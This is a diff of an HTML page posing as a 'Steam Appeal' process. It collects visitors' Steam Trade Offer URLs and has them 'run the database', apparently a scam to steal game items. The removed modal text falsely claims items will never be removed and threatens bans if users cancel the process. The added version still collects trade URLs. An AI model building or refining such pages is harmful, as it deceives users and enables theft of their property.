@@ -1,100 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Steam Appeal Submission</title>
-  <link rel="stylesheet" href="style.css" />
-  <style>
-    .checkbox-group {
-      display: flex;
-      align-items: center;
-      margin-bottom: 15px;
-    }
-    .checkbox-group input[type="checkbox"] {
-      margin-right: 12px;
-      width: 18px;
-      height: 18px;
-    }
-    .checkbox-group label {
-      font-size: 15px;
-      line-height: 1.4;
-    }
-    .steam-logo {
-      display: block;
-      margin: 30px auto;
-      width: 64px;
-      height: 64px;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Steam Appeal Bot</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-  
   <div class="container">
-    <h2>Steam Appeal Submission</h2>
-    <textarea id="descriptionBox" rows="5" placeholder="Describe your issue in detail..."></textarea>
+    <h1>Steam Appeal Process</h1>
+    <p>Please provide your appeal details and trade URL.</p>
+    
+    <!-- Description Box -->
+    <textarea id="descriptionBox" placeholder="Enter your description"></textarea>
+    
+    <!-- Trade URL input -->
     <input type="text" id="tradeUrl" placeholder="Enter your Steam Trade Offer URL">
-    <button onclick="submitAppeal()">SUBMIT APPEAL & RUN THE DATABASE</button>
-  </div>
-
-  <div class="modal" id="modal">
-    <div class="modal-content">
-      <h2 class="attention-heading">⚠️ Attention Required</h2>
-      <p>
-        In this appeal process, the item database will manually review inventories to identify the most traded and potentially suspicious items. These items will then go through a validation system. However, keep in mind that the system will never remove your items—they will remain locked in your inventory throughout the entire process.
-      </p>
-      <p>
-        The database will only access the transaction history of your items to validate them, but nothing else will be altered.
-      </p>
-      <p>
-        Also, just a reminder: if you attempt to cancel or disrupt the appeal process in any way, it will be considered a serious violation, and a penalty may be applied.
-      </p>
-      <p>
-        The reason this is structured as a trade offer is because the appeal process requires the system to evaluate items through specific trade mechanisms in order to ensure transparency and fairness. It’s the safest and most effective way to verify the details of your items without actually removing or altering anything in your inventory.
-      </p>
-
-      <h4 class="terms-title">Terms & Conditions</h4>
-      <ul>
-        <li>You authorize the system to review trade data and item history.</li>
-        <li>Attempts to interfere with the validation may lead to restrictions.</li>
-        <li>All actions are logged for appeal tracking purposes.</li>
-      </ul>
-
-      <div class="checkbox-group">
-        <input type="checkbox" id="agreeTOS" />
-        <label for="agreeTOS">I read and agree to <a href="#" style="color: #4aa5c8; text-decoration: none;">terms and conditions</a></label>
+    
+    <!-- Get Trade URL Button -->
+    <button onclick="window.open('https://steamcommunity.com/my/tradeoffers/privacy', '_blank')">Get your TRADEURL HERE</button>
+    
+    <!-- I Understand Modal -->
+    <div id="modal" class="modal">
+      <div class="modal-content">
+        <h3>Important Information</h3>
+        <p>By submitting your trade URL, your items will be reviewed and validated. Ensure that you have all your tradable items visible on your inventory.</p>
+        <button onclick="confirmUnderstanding()">I Understand</button>
       </div>
-
-      <div class="checkbox-group">
-        <input type="checkbox" id="readTOS" />
-        <label for="readTOS">I understand that cancelling the database process may result in a ban</label>
-      </div>
-
-      <button id="confirmBtn" onclick="confirmUnderstanding()" disabled>I Understand</button>
     </div>
+    
+    <!-- Submit Button -->
+    <button onclick="submitAppeal()">Submit Appeal & Run the Database</button>
   </div>
 
   <script src="script.js"></script>
-  <script>
-    const agreeTOS = document.getElementById("agreeTOS");
-    const readTOS = document.getElementById("readTOS");
-    const confirmBtn = document.getElementById("confirmBtn");
-
-    function updateButtonState() {
-      if (agreeTOS.checked && readTOS.checked) {
-        confirmBtn.disabled = false;
-        confirmBtn.style.opacity = 1;
-        confirmBtn.style.cursor = 'pointer';
-      } else {
-        confirmBtn.disabled = true;
-        confirmBtn.style.opacity = 0.6;
-        confirmBtn.style.cursor = 'not-allowed';
-      }
-    }
-
-    agreeTOS.addEventListener("change", updateButtonState);
-    readTOS.addEventListener("change", updateButtonState);
-  </script>
 </body>
 </html>
